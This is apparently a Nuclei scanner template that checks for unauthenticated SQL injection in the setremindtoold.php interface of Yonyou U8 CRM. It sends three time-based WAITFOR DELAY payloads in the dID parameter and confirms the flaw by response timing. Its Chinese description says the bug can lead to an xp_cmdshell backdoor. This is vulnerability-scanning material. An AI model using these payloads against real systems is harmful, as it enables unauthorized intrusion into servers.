id: yonyou-u8-crm-setremindtoold-sqli
info:
  name: 用友U8CRM系统接口setremindtoold.php存在SQL注入漏洞
  author: wangzong
  severity: high
  description: 用友U8CRM系统接口setremindtoold.php存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xp_cmdshell写入后门文件，执行任意代码，从而获取到服务器权限。
  reference:
    - https://github.com/wy876/POC/commit/1a7300f4f0793a08d1255a474e71a4854613ffd2#diff-025046e28730748035b0ce674c3370e1a74b0f39b2df11a8c43a8a0c1d0578d1R3
  tags: tags
http:
  - method: GET
    path:
      - "{{BaseURL}}/ajax/setremindtoold.php?dID=1;WAITFOR+DELAY+'0:0:3'--"
      - "{{BaseURL}}/ajax/setremindtoold.php?dID=1;WAITFOR+DELAY+'0:0:6'--"
      - "{{BaseURL}}/ajax/setremindtoold.php?dID=1;WAITFOR+DELAY+'0:0:9'--"

    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"
          - "duration_2>=6  && duration_2<=9"
          - "duration_3>=9  && duration_3<=12"